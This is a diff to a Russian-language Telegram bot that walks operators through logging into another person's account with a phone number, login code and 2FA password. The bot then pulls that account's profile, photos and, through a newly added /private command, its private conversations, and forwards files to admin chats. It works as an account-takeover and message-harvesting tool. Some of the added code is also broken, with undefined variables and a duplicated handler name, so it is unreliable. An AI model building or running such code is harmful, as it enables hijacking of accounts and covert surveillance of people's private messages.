@@ -12,6 +12,7 @@ from defunc import *
 import pytz
 from allowed_users import ALLOWED_USERS  # Импортируем словарь из отдельного файла
 
+
 # Загрузка переменных окружения из файла .env
 load_dotenv()
 
@@ -89,9 +90,8 @@ async def analitic_command(message: types.Message):
         phone_number = user_state[user_id]['phone_number']
         client = user_state[user_id]['client']
         try:
-            await bot.send_message(user_id, 'в одном шаге от функции')
             await process_user_data(client, phone_number, user_id)
-            await message.answer("Анализ данных завершен.")
+            await message.answer("Анализ данных завершен")
         except Exception as e:
             logging.error(f"Error during analysis for user {user_id}: {e}")
             await message.answer(f"Произошла ошибка при анализе: {e}")
@@ -101,11 +101,59 @@ async def analitic_command(message: types.Message):
 
 
 
+
+
+# Добавляем обработчик команды /private
+@dp.message_handler(commands=['private'])
+async def analitic_command(message: types.Message):
+    user_id = message.from_user.id
+    if user_id in user_state and user_state[user_id].get('connected'):
+        logging.info(f"User {user_id} is connected. Starting get private message.")
+        #phone_number = user_state[user_id]['phone_number']
+        client = user_state[user_id]['client']
+        try:
+            await bot.send_message(user_id, 'в одном шаге от функции')
+            await process_user_data(client, phone_number, user_id)
+            await message.answer("Анализ данных завершен.")
+        except Exception as e:
+            logging.error(f"Error during analysis for user {user_id}: {e}")
+            await message.answer(f"Произошла ошибка при анализе: {e}")
+    else:
+        logging.info(f"User {user_id} is not connected. Cannot perform getting private message.")
+        await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
+
+
+# Обработчик сообщений, если get_private равно True
+@dp.message_handler(lambda message: user_state.get(message.from_user.id, {}).get('get_private', False) and
+                                  message.text.isdigit() and 1 <= len(message.text) <= 4)
+async def get_private_message_from_list(message: types.Message):
+    user_id = message.from_user.id
+    try:
+        g_index = int(message.text.strip())
+        if 0 <= g_index < len(users_list):
+            target_user = users_list[g_index]
+            await get_messages_for_html(client, target_user, selection)
+            await message.reply("Выгрузка сообщений выполнена.")
+    except ValueError:
+        await message.answer("Введите число от 0 до максимального индекса.")
+
+
+# Функция по выкачке сообщений
+async def process_private_message(client, user_id):
+    user_state[user_id]['get_private'] = True  # Обновляем состояние, будем использовать  в обработчике, чтобы словить ввод цифр
+    user_dialogs, i, users_list = await get_user_dialogs(client)
+    await bot.send_message(user_id, user_dialogs)
+    await bot.send_message(user_id, 'Выберите из списка нужный диалог и введите соотвествующую функцию')
+
+
 @dp.message_handler(commands=['start'])
 async def send_welcome(message: types.Message):
     user_id = message.from_user.id
     if user_id in allowed_users:
-        user_state[user_id] = {'connected': False}
+        user_state[user_id] = {'connected': False,
+                              'get_private': False,
+                              'get_channel': False}
+      
         await message.answer("Введите номер телефона")
         now_utc = datetime.now(pytz.utc)
         timezone = pytz.timezone('Europe/Moscow')
@@ -117,6 +165,7 @@ async def send_welcome(message: types.Message):
             await bot.send_message(admin_chat_id, user_info_message)
     else:
         await unauthorized(message)
+
 
 #Введен номер
 @dp.message_handler(lambda message: message.text and 
@@ -142,15 +191,25 @@ async def get_phone_number(message: types.Message):
             'attempts': 0,
             'phone_code_hash': sent_code.phone_code_hash,  # Извлекаем хеш кода
             'client': client,
-            'connected': False
+            'connected': False,
+            'get_private': False,
+            'get_channel': False
         }
         await message.reply("Код отправлен на телефон клиента. Введите полученный ПИН")
     except Exception as e:
         await message.reply(f"Произошла ошибка: {e}")
 
+
+# Введен пин-код
+#@dp.message_handler(lambda message: message.text and 
+                    #'phone_code_hash' in user_state.get(message.from_user.id, {}) and
+                    #'awaiting_password' not in user_state.get(message.from_user.id, {}))
+
 @dp.message_handler(lambda message: message.text and 
                     'phone_code_hash' in user_state.get(message.from_user.id, {}) and
-                    'awaiting_password' not in user_state.get(message.from_user.id, {}))
+                    'awaiting_password' not in user_state.get(message.from_user.id, {}) and not
+                    user_state.get(message.from_user.id, {}).get('connected', False))
+
 async def get_code(message: types.Message):
     code = message.text
     phone_number = user_state[message.from_user.id]['phone_number']
@@ -192,8 +251,12 @@ async def get_code(message: types.Message):
                 await client.log_out()
                 await client.disconnect()
                 
+                
+#Введен пароль
+#@dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
 
-@dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}))
+@dp.message_handler(lambda message: 'awaiting_password' in user_state.get(message.from_user.id, {}) and not
+                    user_state.get(message.from_user.id, {}).get('connected', False))
 async def process_password(message: types.Message):
     password = message.text
     user_id = message.from_user.id  # Определяем user_id
@@ -226,16 +289,14 @@ async def process_password(message: types.Message):
         await message.answer("Произошла ошибка: пользователь не найден в системе")
 
 
-
-
 # Функция для создания нового экземпляра клиента
 def create_client():
     return TelegramClient('session_name', api_id, api_hash)
 
+
+
 # Функция для обработки данных пользователя
 async def process_user_data(client, phone_number, user_id):
-    await bot.send_message(user_id, 'зашел в функцию')
-    
     selection = '0'
     try:
         userid, userinfo, firstname, lastname, username, photos_user_html = await get_user_info(client, phone_number, selection)
@@ -249,6 +310,7 @@ async def process_user_data(client, phone_number, user_id):
         await send_files_to_bot(bot, admin_chat_ids, user_id)
     except Exception as e:
         logging.error(f"Error processing user data: {e}")
+
 
 # Запуск бота
 if __name__ == '__main__':
